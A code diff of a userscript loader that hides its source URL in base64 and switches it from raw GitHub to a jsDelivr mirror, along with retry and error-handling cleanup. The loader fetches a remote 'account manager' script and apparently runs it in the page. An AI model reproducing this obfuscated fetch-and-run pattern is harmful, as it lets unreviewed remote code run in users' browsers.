@@ -29,10 +29,8 @@
             return "";
         }
     }
-    const sourceUrl = decodeBase64("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01pbmhiZW84L2V4dGVuc2lvbl9tdWx0aV9Ccm93c2VyL21haW4vbXVsdGktdGFiLWFjY291bnQtbWFuYWdlci51c2VyLmpz");
-
+    const sourceUrl = decodeBase64("aHR0cHM6Ly9jZG4uanNkbGV2ci5uZXQvZ2gvTWluaGJlbzgvZXh0ZW5zaW9uX211bHRpX0Jyb3dzZXJAbWFpbi9tdWx0aS10YWItYWNjb3VudC1tYW5hZ2VyLnVzZXIuanM=");
     let fetchedCode = null, isInitialized = false;
-
     function loadSourceCode(retryCount = 0) {
         const maxRetries = 3, retryDelay = 2000 * (retryCount + 1);
         return new Promise(function(resolve, reject) {
@@ -49,40 +47,36 @@
                     if (response.status === 200 && response.responseText.trim()) {
                         resolve(response.responseText);
                     } else {
-                        const error = new Error("HTTP Error: " + response.status + " - " + response.statusText);
                         if (retryCount < maxRetries) {
                             setTimeout(function() {
                                 loadSourceCode(retryCount + 1).then(resolve).catch(reject);
                             }, retryDelay);
                         } else {
-                            reject(error);
+                            reject(new Error("HTTP Error: " + response.status + " - " + response.statusText));
                         }
                     }
                 },
                 onerror: function(error) {
-                    const netError = new Error("Network Error: " + JSON.stringify(error));
                     if (retryCount < maxRetries) {
                         setTimeout(function() {
                             loadSourceCode(retryCount + 1).then(resolve).catch(reject);
                         }, retryDelay);
                     } else {
-                        reject(netError);
+                        reject(new Error("Network Error: " + JSON.stringify(error)));
                     }
                 },
                 ontimeout: function() {
-                    const timeoutError = new Error("Timeout: Không thể kết nối đến server");
                     if (retryCount < maxRetries) {
                         setTimeout(function() {
                             loadSourceCode(retryCount + 1).then(resolve).catch(reject);
                         }, retryDelay);
                     } else {
-                        reject(timeoutError);
+                        reject(new Error("Timeout: Không thể kết nối đến server"));
                     }
                 }
             });
         });
     }
-
     function main() {
         if (isInitialized || !fetchedCode) return;
         isInitialized = true;
@@ -127,13 +121,11 @@
             }
         }
     }
-
     const observer = new MutationObserver(() => {
         if (document.body && fetchedCode) {
             main();
         }
     });
-
     function initialize() {
         loadSourceCode().then(code => {
             fetchedCode = code;
@@ -144,6 +136,5 @@
             }
         }).catch(() => {});
     }
-
     initialize();
 })();
